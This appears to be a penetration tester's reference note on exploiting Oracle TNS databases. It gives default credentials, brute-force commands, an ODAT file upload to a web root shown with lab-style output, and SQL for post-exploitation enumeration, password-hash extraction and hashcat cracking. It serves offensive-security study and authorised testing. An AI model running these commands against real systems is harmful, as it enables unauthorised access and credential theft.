---
id: Exploitation
aliases: []
tags:
  - Networking/Services/Oracle-TNS/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Default Credentials {{{-->
## Default Credentials

Common default credentials

> [!info]-
>
> ```
> sys:change_on_install
> system:manager
> system:oracle
> scott:tiger
> dbsnmp:dbsnmp
> sysman:sysman
> admin:admin
> ```

[SQL Plus](https://en.wikipedia.org/wiki/SQL_Plus) —
Connect using default credentials

```sh
sqlplus sys/change_on_install@<target>:1521/ORCL as sysdba
```
```sh
sqlplus system/manager@<target>:1521/ORCL
```

___

<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

[[Hydra]] — Brute force

```sh
hydra -L <users.txt> -P <passwords.txt> <target> oracle-listener
```

[[Enumeration#ODAT|ODAT]] — Brufe force

```sh
odat passwordguesser -s <target> -d ORCL -U <users.txt> -P <passwords.txt>
```

[[Metasploit]] — Oracle Account Discovery
(*[oracle_login](https://www.rapid7.com/db/modules/auxiliary/admin/oracle/oracle_login/)*)

```sh
use auxiliary/admin/oracle/oracle_login
```

<!-- Example {{{-->
> [!example]-
>
>
> Uses a list of well known default authentication credentials
> to discover easily guessed accounts
>
> ```sh
> msf > use auxiliary/admin/oracle/oracle_login
> msf auxiliary(oracle_login) > show actions
>     ...actions...
> msf auxiliary(oracle_login) > set ACTION < action-name >
> msf auxiliary(oracle_login) > show options
>     ...show and set options...
> msf auxiliary(oracle_login) > run
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- File Upload {{{-->
## File Upload

It may be possible to upload a web shell to the target with
[[Enumeration#ODAT|ODAT]] if

- the server is running a web server
- the server's [[Web Server Root|root directory location]]
  is known

1. Create a payload

```sh
echo "Oracle File Upload Test" > testing.txt
```

2. Upload the file to the database with [[Enumeration#ODAT|ODAT]]

```sh
./odat.py utlfile -s <target_ip> -d XE -U <use> -P <password> --sysdba --putFile C:\\path\\to <file.ext> ./testing.txt
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
> ```
>
> ```sh
> [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
> [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
> ```
>
> > [!info]-
> >
> > - `utlfile`: [Oracle UTL_FILE](https://docs.oracle.com/database/121/ARPLS/u_file.htm)
> >   functionality to upload a file
> > - `-s 10.129.204.235`: target IP of the Oracle instance.
> > - `-d XE`: database/SID (Oracle XE).
> > - `-U scott`: username
> > - `-P tiger`: password in cleartext
> > - `--sysdba`: run with SYSDBA privileges
> > - `--putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`:
> >   upload a file to the DB server's filesystem
> >
<!-- }}} -->

3. Test if the uppload worked with [cURL](https://curl.se/)

```sh
curl -X GET http://10.129.204.235/testing.txt
```
```sh
Oracle File Upload Test
```
<!-- }}} -->

___

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

Enumerate Oracle TNS server after successful exploitation

<!-- Version {{{-->
### Version

Gather Oracle version information to identify vulnerabilities

Oracle version

```sql
SELECT * FROM v$version;
```

Banner information

```sql
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
```

Instance name and status

```sql
SELECT instance_name, status, version FROM v$instance;
```

Database name

```sql
SELECT name, created FROM v$database;
```

Platform information

```sql
SELECT platform_name FROM v$database;
```

<!-- }}} -->

<!-- User {{{-->
### User

List user account and their privileges for privilege escalation

List all users

```sql
SELECT username FROM dba_users;
```

```sql
SELECT username FROM all_users;
```

Current user

```sql
SELECT user FROM dual;
```

```sql
SELECT sys_context('USERENV', 'CURRENT_USER') FROM dual;
```

User privileges

```sql
SELECT * FROM user_sys_privs;
```

```sql
SELECT * FROM user_role_privs;
```

DBA users

```sql
SELECT username FROM dba_users WHERE username IN (SELECT grantee FROM dba_role_privs WHERE granted_role='DBA');
```

Users with specific privileges

```sql
SELECT grantee FROM dba_sys_privs WHERE privilege='CREATE SESSION';
```

<!-- }}} -->

<!-- Privilege {{{-->
### Privilege

Enumerate available privileges

System privileges for current user

```sql
SELECT * FROM session_privs;
```

All system privileges

```sql
SELECT * FROM dba_sys_privs WHERE grantee='USERNAME';
```

Role privileges

```sql
SELECT * FROM dba_role_privs WHERE grantee='USERNAME';
```

Table privileges

```sql
SELECT * FROM dba_tab_privs WHERE grantee='USERNAME';
```

Check for DBA role

```sql
SELECT granted_role FROM user_role_privs WHERE granted_role='DBA';
```

<!-- }}} -->

<!-- Table & Schema {{{-->
### Table & Schema

Discover database structure to locate sensitive data

List all tables owned by current user

```sql
SELECT table_name FROM user_tables;
```

List all tables in database (requires privileges)

```sql
SELECT owner, table_name FROM all_tables;
```

```sql
SELECT owner, table_name FROM dba_tables;
```

Columns in specific table

```sql
SELECT column_name, data_type FROM all_tab_columns WHERE table_name='USERS';
```

Find sensitive columns

```sql
SELECT table_name, column_name FROM all_tab_columns
WHERE column_name LIKE '%PASSWORD%'
   OR column_name LIKE '%PASS%'
   OR column_name LIKE '%SECRET%'
   OR column_name LIKE '%TOKEN%';
```

Count rows in tables

```sql
SELECT table_name, num_rows FROM all_tables WHERE owner='SCHEMA_NAME';
```

<!-- }}} -->

<!-- Hash Extraction {{{-->
### Hash Extraction

Extract password hashes and crack them offline

> [!warning]
>
> `DBA` privileges required

Extract password hashes (*Oracle 11g+*)

```sql
SELECT name, spare4 FROM sys.user$;
```

Extract password hashes (*Oracle 10g*)

```sql
SELECT name, password FROM sys.user$;
```

Both versions

```sql
SELECT username, password, spare4 FROM dba_users;
```

Password versions

```sql
SELECT username, password_versions FROM dba_users;
```

Extract hashes with [SQL Plus](https://en.wikipedia.org/wiki/SQL_Plus)

> [!example]-
>
>
> ```sql
> sqlplus <user>/<password>@<target>:1521/ORCL <<EOF
> SET PAGESIZE 0
> SET FEEDBACK OFF
> SELECT username||':'||password||':'||spare4 FROM dba_users;
> EXIT
> EOF > oracle_hashes.txt
> ```

#### Hash Cracking

[[hashcat]] — Crack Oracle password hashes

Crack Oracle 10g hashes (*DES-based*)

```sh
hashcat -m 3100 oracle_10g_hashes.txt rockyou.txt
```

Crack Oracle 11g hashes (*SHA-1 based*)

```sh
hashcat -m 112 oracle_11g_hashes.txt rockyou.txt
```

Crack Oracle 12c hashes (*PBKDF2-SHA-512*)

```sh
hashcat -m 12300 oracle_12c_hashes.txt rockyou.txt
```

<!-- }}} -->

___

<!-- }}} -->

<!-- }}} -->
